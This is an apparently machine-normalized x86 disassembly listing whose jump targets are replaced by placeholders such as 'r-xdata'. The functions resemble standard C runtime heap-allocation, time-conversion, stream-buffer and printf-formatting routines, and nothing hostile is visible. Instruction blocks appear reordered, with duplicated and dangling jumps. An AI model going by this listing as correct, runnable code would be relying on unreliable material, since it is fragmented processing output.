je r-xdata
mov ebx edx
add ebx 0x14
cmp ebx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ eax + 0xc4 ]
mov esi [ eax + 0x44 ]
and edx [ ebp - 0x8 ]
and esi [ ebp - 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x44 ]
or edx esi
mov esi [ ebp - 0xc ]
jne r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
inc [ ebp - 0x4 ]
and edx [ ebp - 0x8 ]
add ecx 0x4
mov edi esi
and edi [ ecx ]
or edx edi
je r-xdata
mov ecx edx
xor edi edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
and ecx esi
jne r-xdata
cmp ebx [ ebp - 0x4 ]
jae r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
test ecx ecx
jl r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
push 0x20
and ecx [ ebp - 0x8 ]
pop edi
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
mov [ ebp - 0x8 ] ecx
sar esi 0x4
dec esi
cmp esi 0x3f
jle r-xdata
shl ecx 0x1
inc edi
jmp r-xdata
push ebx
call sub_40ab5d
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ebx edx
cmp ebx [ ebp - 0x4 ]
add ebx 0x14
mov [ ebp + 0x8 ] ebx
jmp r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
xor eax eax
jmp r-xdata
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_40aaac
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
jge r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ edx + 0x4 ] edi
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xb ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx ] ecx
jmp r-xdata
and [ rw-data ] 0x0
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_40aaac
mov eax [ rw-data ]
mov ecx [ rw-data ]
push esi
push edi
xor edi edi
cmp eax ecx
jne r-xdata
mov ecx [ rw-data ]
push 0x41c4
push 0x8
lea eax [ eax + eax * 4 ]
push [ rw-data ]
lea esi [ ecx + eax * 4 ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je r-xdata
lea eax [ ecx + ecx * 4 + 0x50 ]
shl eax 0x2
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
add [ rw-data ] 0x10
mov [ rw-data ] eax
mov eax [ rw-data ]
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
sub_40ab5d
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi [ ecx + 0x10 ]
mov eax [ ecx + 0x8 ]
xor ebx ebx
mov eax ebx
push 0x3f
imul eax eax 0x204
pop edx
lea eax [ eax + esi + 0x144 ]
mov [ ebp - 0x4 ] eax
shl eax 0x1
inc ebx
jmp r-xdata
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
mov edi ebx
push 0x4
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x1000
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
test eax eax
jl r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ edi + 0xc ]
add eax 0x1f8
push 0x1
pop edi
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea ecx [ eax + 0xffc ]
mov [ eax - 0x4 ] 0xff0
mov [ eax ] ecx
lea ecx [ eax - 0x1004 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
lea ecx [ eax - 0x10 ]
cmp ecx edx
jbe r-xdata
sub_40ac58
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov edx edi
lea esi [ eax + 0x17 ]
sub edx [ ecx + 0xc ]
mov eax [ ecx + 0x10 ]
and esi 0xfffffff0
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
dec ecx
cmp esi ecx
mov [ ebp + 0x10 ] ecx
mov ebx [ ecx + edi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
push 0x1
pop eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
mov [ ebp + 0xc ] ebx
sar esi 0x4
dec esi
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] ecx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov ecx [ edi + 0x4 ]
mov esi [ edi + 0x8 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov edx 0x80000000
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx esi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
mov edx 0x80000000
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx edi
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
shr edx cl
or [ eax ] edx
sub_40af4e
push ebp
mov ebp esp
sub esp 0x24
push ebx
mov ebx [ ebp + 0x8 ]
sub ebx 0x76c
cmp ebx 0x46
jl r-xdata
or eax 0xffffffff
cmp ebx 0x8a
jg r-xdata
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ edi * 4 + rw-data ]
add esi [ ebp + 0x10 ]
test bl 0x3
jne r-xdata
call sub_40df1c
mov eax ebx
lea ecx [ ebx - 0x1 ]
imul eax eax 0x16d
sar ecx 0x2
mov edx esi
mov [ ebp - 0x8 ] esi
add edx ecx
mov [ ebp - 0x10 ] ebx
add eax edx
mov edx [ ebp + 0x1c ]
lea ecx [ eax + eax * 2 ]
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x1c ] eax
lea ecx [ eax + ecx * 8 ]
imul ecx ecx 0x3c
add ecx [ ebp + 0x18 ]
imul ecx ecx 0x3c
add ecx [ rw-data ]
dec edi
cmp [ ebp + 0x20 ] 0x1
mov [ ebp - 0x14 ] edi
pop edi
pop esi
lea ecx [ ecx + edx + 0x7c558180 ]
mov [ ebp + 0x8 ] ecx
je r-xdata
cmp edi 0x2
jle r-xdata
add ecx [ rw-data ]
cmp [ ebp + 0x20 ] 0xffffffff
jne r-xdata
inc esi
pop ebx
leave
retn
mov eax ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_40e18f
pop ecx
mov ecx [ ebp + 0x8 ]
test eax eax
je r-xdata
sub_40b010
mov ecx [ esp + 0x4 ]
xor edx edx
mov [ rw-data ] ecx
mov eax rw-data
mov eax [ edx * 8 + rw-data ]
mov [ rw-data ] eax
retn
add eax 0x8
inc edx
cmp eax rw-data
jl r-xdata
cmp ecx [ eax ]
je r-xdata
cmp ecx 0x13
jb r-xdata
cmp ecx 0xbc
jb r-xdata
cmp ecx 0x24
ja r-xdata
mov [ rw-data ] 0x16
cmp ecx 0xca
mov [ rw-data ] 0x8
jbe r-xdata
mov [ rw-data ] 0xd
retn
retn
sub_40b077
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
mov ebx [ esi + 0x10 ]
test al 0x82
je r-xdata
or al 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne r-xdata
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp + 0xc ] 0x0
and al 0xef
or al 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
cmp esi rw-data
je r-xdata
mov ecx [ esi + 0x8 ]
and al 0xfe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x1
lea eax [ ebp + 0x8 ]
pop edi
push edi
push eax
push ebx
call sub_40c6bf
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
dec ecx
test edi edi
mov [ esi + 0x4 ] ecx
jle r-xdata
push ebx
call sub_40e4bf
test eax eax
pop ecx
jne r-xdata
cmp esi rw-data
jne r-xdata
mov eax [ ebp + 0x8 ]
and eax 0xff
jmp r-xdata
or [ esi + 0xc ] 0x20
jmp r-xdata
cmp ebx 0xffffffff
je r-xdata
push edi
push eax
push ebx
call sub_40c6bf
add esp 0xc
mov [ ebp + 0xc ] eax
jmp r-xdata
push esi
call sub_40e47b
pop ecx
pop esi
pop ebx
pop ebp
retn
or eax 0xffffffff
mov eax rw-data
mov eax ebx
mov ecx ebx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + ecx * 8 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push 0x0
push ebx
call sub_40c2e5
add esp 0xc
test [ eax + 0x4 ] 0x20
je r-xdata
cmp [ ebp + 0xc ] edi
pop edi
je r-xdata
sub_40b18c
push ebp
mov ebp esp
sub esp 0x248
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
xor esi esi
mov bl [ edi ]
inc edi
test bl bl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x14 ] esi
mov [ ebp + 0xc ] edi
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
xor edx edx
jmp r-xdata
cmp [ ebp - 0x14 ] edx
jl r-xdata
cmp bl 0x20
jl r-xdata
xor eax eax
cmp bl 0x78
jg r-xdata
mov edi [ ebp + 0xc ]
mov bl [ edi ]
inc edi
test bl bl
mov [ ebp + 0xc ] edi
jne r-xdata
jmp [ eax * 4 + jump_table_40b8ad ]
movsx eax bl
mov al [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x30 ]
xor edx edx
or [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x24 ] edx
jmp r-xdata
movsx eax bl
sub eax 0x20
je r-xdata
cmp bl 0x2a
jne r-xdata
mov [ ebp - 0x10 ] edx
jmp r-xdata
cmp bl 0x2a
jne r-xdata
cmp bl 0x49
je r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] edx
movzx eax bl
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
movsx eax bl
cmp eax 0x67
jg r-xdata
movsx eax [ esi + eax * 8 + r--data ]
sar eax 0x4
cmp eax 0x7
mov [ ebp - 0x30 ] eax
ja r-xdata
or [ ebp - 0x4 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x20 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40d043
test eax eax
pop ecx
mov [ ebp - 0x20 ] eax
jge r-xdata
lea eax [ ecx + ecx * 4 ]
movsx ecx bl
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40d043
test eax eax
pop ecx
mov [ ebp - 0x10 ] eax
jge r-xdata
cmp [ edi ] 0x36
jne r-xdata
cmp bl 0x68
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_40b8cd
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_40b8cd
mov bl [ edi ]
add esp 0xc
inc edi
mov [ ebp + 0xc ] edi
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
or [ ebp - 0x4 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0x4
neg eax
or [ ebp - 0x10 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x30 ] edx
cmp [ edi + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x4 ] 0x20
jmp r-xdata
cmp bl 0x6c
je r-xdata
or [ ebp - 0x4 ] 0x40
sub eax 0x5
je r-xdata
or [ ebp - 0x4 ] 0x40
lea edi [ ebp - 0x248 ]
cmp ecx edx
mov [ ebp - 0x8 ] edi
jge r-xdata
cmp eax 0x58
jg r-xdata
or [ ebp - 0x4 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
inc edi
inc edi
or [ ebp - 0x3 ] 0x80
mov [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp - 0x4 ] 0x10
jmp r-xdata
cmp bl 0x77
jne r-xdata
test [ ebp - 0x4 ] 0x20
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40d050
pop ecx
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40d043
test [ ebp - 0x4 ] 0x20
pop ecx
je r-xdata
dec eax
je r-xdata
jne r-xdata
mov [ ebp - 0x10 ] 0x6
jmp r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ebp - 0x3 ] 0x8
jmp r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
je r-xdata
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov cx [ ebp - 0x14 ]
mov [ eax ] cx
jmp r-xdata
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0xc ] 0x8
je r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x10 ]
push [ ebp - 0x34 ]
add eax 0x8
mov [ ebp + 0x10 ] eax
push [ ebp - 0x10 ]
mov ecx [ eax - 0x8 ]
mov [ ebp - 0x48 ] ecx
mov eax [ eax - 0x4 ]
mov [ ebp - 0x44 ] eax
movsx eax bl
push eax
lea eax [ ebp - 0x248 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call [ rw-data ]
mov esi [ ebp - 0x4 ]
add esp 0x14
and esi 0x80
je r-xdata
cmp bl 0x67
jne r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40d043
test eax eax
pop ecx
je r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x2c ] 0x7
sub eax 0x43
je r-xdata
or [ ebp - 0x4 ] 0x8
jmp r-xdata
call sub_40d043
pop ecx
xor edx edx
call sub_40d043
pop ecx
jmp r-xdata
call sub_40d043
pop ecx
movzx eax ax
jmp r-xdata
call sub_40d043
pop ecx
movsx eax ax
mov esi eax
mov edi edx
test edx edx
jg r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
test [ ebp - 0x3 ] 0x80
je r-xdata
or [ ebp - 0x3 ] 0x2
jmp r-xdata
mov [ ebp - 0x10 ] 0x8
sub eax 0x3
je r-xdata
cmp bl 0x67
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
push eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
test [ ebp - 0x4 ] 0x810
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
dec eax
je r-xdata
mov al [ ebp - 0x2c ]
mov [ ebp - 0x16 ] 0x30
add al 0x51
mov [ ebp - 0x1c ] 0x2
mov [ ebp - 0x15 ] al
jmp r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cdq
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jge r-xdata
and edi 0x0
jl r-xdata
mov esi [ ebp - 0x10 ]
cmp esi 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp - 0x248 ] 0x2d
jne r-xdata
test esi esi
jne r-xdata
lea eax [ ebp - 0x248 ]
push eax
call [ rw-data ]
pop ecx
call sub_40e5a0
pop ecx
jmp r-xdata
test [ ebp - 0x3 ] 0x8
je r-xdata
call sub_40d043
pop ecx
mov [ ebp - 0x248 ] al
mov [ ebp - 0xc ] 0x1
call sub_40b96b
push eax
lea eax [ ebp - 0x248 ]
push eax
call sub_40e61b
add esp 0xc
mov [ ebp - 0xc ] eax
test eax eax
jge r-xdata
jmp r-xdata
or [ ebp - 0x3 ] 0x8
mov [ ebp - 0x34 ] 0x1
add bl 0x20
dec eax
dec eax
je r-xdata
and [ ebp - 0x4 ] 0xfffffff7
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
mov esi eax
neg edx
or [ ebp - 0x3 ] 0x1
mov edi edx
jmp r-xdata
test eax eax
jae r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40d043
test [ ebp - 0x4 ] 0x810
pop ecx
mov ecx eax
mov [ ebp - 0x8 ] ecx
je r-xdata
mov esi 0x7fffffff
mov [ ebp - 0xc ] 0xa
sub eax 0x3
jne r-xdata
push edi
or [ ebp - 0x3 ] 0x1
lea edi [ ebp - 0x247 ]
mov [ ebp - 0x8 ] edi
lea eax [ ebp - 0x248 ]
push eax
call [ rw-data ]
pop ecx
mov [ ebp - 0xc ] eax
and [ ebp - 0x24 ] 0x0
mov [ ebp - 0x8 ] ecx
movsx eax [ eax ]
jmp r-xdata
movsx eax [ eax ]
shr eax 0x1
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x24 ] 0x1
jmp r-xdata
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
lea eax [ ebp - 0x248 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
sub eax 0xc
jne r-xdata
lea eax [ ebp - 0x49 ]
mov [ ebp - 0x8 ] eax
and [ ebp - 0x1c ] 0x0
mov eax esi
or eax edi
jne r-xdata
test [ ebp - 0x3 ] 0x80
jne r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov [ ebp - 0x2c ] 0x27
jmp r-xdata
mov ebx [ ebp - 0x4 ]
test bl 0x40
je r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
mov eax [ ebp - 0xc ]
cdq
push edx
push eax
push edi
push esi
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] edx
